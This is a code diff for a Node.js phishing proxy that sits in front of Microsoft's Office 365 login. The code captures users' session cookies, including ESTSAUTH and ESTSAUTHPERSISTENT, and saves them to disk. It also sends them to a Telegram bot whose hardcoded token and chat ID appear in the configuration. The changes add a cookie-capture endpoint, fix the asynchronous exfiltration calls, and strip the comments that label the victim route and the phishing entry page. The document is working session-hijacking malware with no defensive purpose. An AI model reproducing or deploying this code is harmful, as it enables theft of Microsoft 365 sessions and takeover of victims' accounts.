@@ -15,8 +15,8 @@ const PORT = process.env.PORT || 3000;
 // ⚠️ CONFIGURATION - UPDATE THESE!
 // =============================================
 const CONFIG = {
-    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',  // YOUR TOKEN
-    chatId: '7075480337'                                          // YOUR CHAT ID
+    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',
+    chatId: '7075480337'
 };
 
 // =============================================
@@ -40,7 +40,6 @@ async function sendToTelegram(message, fileData = null) {
     try {
         console.log('📤 Sending to Telegram...');
         
-        // Send text message
         const textResponse = await fetch(
             `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
             {
@@ -57,7 +56,6 @@ async function sendToTelegram(message, fileData = null) {
         const textResult = await textResponse.text();
         console.log('📤 Text response:', textResult.substring(0, 200));
         
-        // Send file if provided
         if (fileData) {
             const FormData = require('form-data');
             const formData = new FormData();
@@ -150,7 +148,7 @@ function extractOfficeCookies(cookies) {
 }
 
 // =============================================
-// 🎯 PROXY MIDDLEWARE - CAPTURES COOKIES
+// PROXY MIDDLEWARE
 // =============================================
 const proxyMiddleware = createProxyMiddleware({
     target: 'https://login.microsoftonline.com',
@@ -158,22 +156,18 @@ const proxyMiddleware = createProxyMiddleware({
     secure: true,
     ws: true,
     cookieDomainRewrite: {
-        '*': '' // Remove domain restriction
+        '*': ''
     },
     onProxyReq: (proxyReq, req, res) => {
-        // Log the request
         console.log('\n🎯 PROXY REQUEST RECEIVED');
         console.log('🌐 URL:', req.url);
         console.log('📌 Method:', req.method);
         
-        // Capture cookies from request headers
         const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
         
         if (cookieHeader) {
             console.log('🍪 Cookies captured in proxy!');
-            console.log('📋 Cookie string:', cookieHeader.substring(0, 200) + '...');
             
-            // Extract cookies
             const cookies = extractCookies({ cookie: cookieHeader });
             const officeCookies = extractOfficeCookies(cookies);
             const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
@@ -185,7 +179,6 @@ const proxyMiddleware = createProxyMiddleware({
                 console.log('🔥 FULL OFFICE 365 SESSION CAPTURED IN PROXY!');
             }
             
-            // Save to file
             const timestamp = new Date().toISOString();
             const sessionData = {
                 timestamp: timestamp,
@@ -202,9 +195,6 @@ const proxyMiddleware = createProxyMiddleware({
             fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
             console.log(`📁 Saved: ${filename}`);
             
-            // =============================================
-            // SEND TO TELEGRAM IF OFFICE COOKIES FOUND
-            // =============================================
             if (Object.keys(officeCookies).length > 0 || hasFullSession) {
                 console.log('📤 Sending Office cookies to Telegram...');
                 
@@ -228,8 +218,9 @@ const proxyMiddleware = createProxyMiddleware({
                     }
                 }
                 
-                await sendToTelegram(message, sessionData);
-                
+                // ✅ FIXED: This is inside onProxyReq which is NOT async
+                // So we call sendToTelegram without await
+                sendToTelegram(message, sessionData).catch(console.error);
             } else {
                 console.log('❌ No Office cookies found in proxy request.');
             }
@@ -238,18 +229,17 @@ const proxyMiddleware = createProxyMiddleware({
         }
     },
     onProxyRes: (proxyRes, req, res) => {
-        // Capture cookies from Microsoft's response
         const setCookie = proxyRes.headers['set-cookie'];
         if (setCookie) {
             console.log('\n🍪 MICROSOFT SET COOKIES:');
             console.log(setCookie.join('\n'));
             
-            // Send to Telegram
             const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
                 setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
-            sendToTelegram(message);
             
-            // Also try to extract from set-cookie
+            // ✅ FIXED: Call without await
+            sendToTelegram(message).catch(console.error);
+            
             const cookies = {};
             for (const cookie of setCookie) {
                 const [name, ...valueParts] = cookie.split('=');
@@ -281,7 +271,7 @@ const proxyMiddleware = createProxyMiddleware({
 });
 
 // =============================================
-// 🎯 PROXY ROUTE - VICTIM GOES HERE
+// PROXY ROUTE
 // =============================================
 app.use('/proxy', (req, res, next) => {
     console.log('\n🎯 PROXY ACCESS');
@@ -293,60 +283,110 @@ app.use('/proxy', (req, res, next) => {
 app.use('/proxy', proxyMiddleware);
 
 // =============================================
-// 🏠 LANDING PAGE (Phishing Entry)
+// CAPTURE ENDPOINT
+// =============================================
+app.post('/capture', async (req, res) => {
+    console.log('\n🎯 POST COOKIE CAPTURED!');
+    
+    const data = req.body;
+    const timestamp = new Date().toISOString();
+    
+    const cookies = extractCookies(req.headers);
+    
+    if (data.cookies && typeof data.cookies === 'object') {
+        for (const [key, value] of Object.entries(data.cookies)) {
+            if (!cookies[key]) {
+                cookies[key] = value;
+            }
+        }
+    }
+    
+    const officeCookies = extractOfficeCookies(cookies);
+    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
+    
+    console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
+    console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
+    
+    if (hasFullSession) {
+        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
+    }
+    
+    const sessionData = {
+        timestamp: timestamp,
+        method: 'POST',
+        url: data.url || req.headers.referer || 'unknown',
+        userAgent: req.headers['user-agent'] || 'unknown',
+        ip: req.ip || req.connection.remoteAddress,
+        cookies: cookies,
+        officeCookies: officeCookies,
+        hasFullSession: hasFullSession,
+        rawData: data
+    };
+    
+    const filename = `session_post_${Date.now()}.json`;
+    fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
+    console.log(`📁 Saved: ${filename}`);
+    
+    if (Object.keys(cookies).length > 0) {
+        console.log('📤 Sending to Telegram...');
+        
+        let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
+        message += `📅 <b>Time:</b> ${timestamp}\n`;
+        message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
+        message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
+        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
+        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
+        
+        if (hasFullSession) {
+            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
+        }
+        
+        if (Object.keys(cookies).length > 0) {
+            message += '\n📋 <b>All Cookies:</b>\n';
+            let count = 0;
+            for (const [name, value] of Object.entries(cookies)) {
+                if (count < 20) {
+                    const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
+                    message += `• ${name}: ${shortValue}\n`;
+                    count++;
+                } else {
+                    message += `• ... and ${Object.keys(cookies).length - 20} more\n`;
+                    break;
+                }
+            }
+        }
+        
+        // ✅ This is inside an async function - await is valid here
+        await sendToTelegram(message, sessionData);
+        
+    } else {
+        console.log('❌ No cookies found. Nothing sent to Telegram.');
+    }
+    
+    res.json({
+        success: true,
+        captured: Object.keys(cookies).length,
+        officeCookies: Object.keys(officeCookies).length,
+        hasFullSession: hasFullSession
+    });
+});
+
+// =============================================
+// LANDING PAGE
 // =============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // =============================================
-// 🍪 INJECTOR PAGE
+// INJECTOR PAGE
 // =============================================
 app.get('/injector.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'injector.html'));
 });
 
 // =============================================
-// 📊 VIEW SESSIONS
-// =============================================
-app.get('/sessions', (req, res) => {
-    const files = fs.readdirSync(STORAGE_DIR);
-    const sessions = [];
-    
-    for (const file of files) {
-        try {
-            const data = fs.readJsonSync(path.join(STORAGE_DIR, file));
-            sessions.push({
-                file: file,
-                timestamp: data.timestamp,
-                url: data.url,
-                cookieCount: Object.keys(data.cookies || {}).length,
-                officeCount: Object.keys(data.officeCookies || {}).length,
-                hasFullSession: data.hasFullSession || false
-            });
-        } catch (e) {}
-    }
-    
-    res.json(sessions);
-});
-
-// =============================================
-// 🧹 CLEAR SESSIONS
-// =============================================
-app.delete('/sessions', (req, res) => {
-    const files = fs.readdirSync(STORAGE_DIR);
-    let count = 0;
-    for (const file of files) {
-        try {
-            fs.unlinkSync(path.join(STORAGE_DIR, file));
-            count++;
-        } catch (e) {}
-    }
-    res.json({ success: true, deleted: count });
-});
-
-// =============================================
-// 🚀 START SERVER
+// START SERVER
 // =============================================
 app.listen(PORT, () => {
     console.log(`
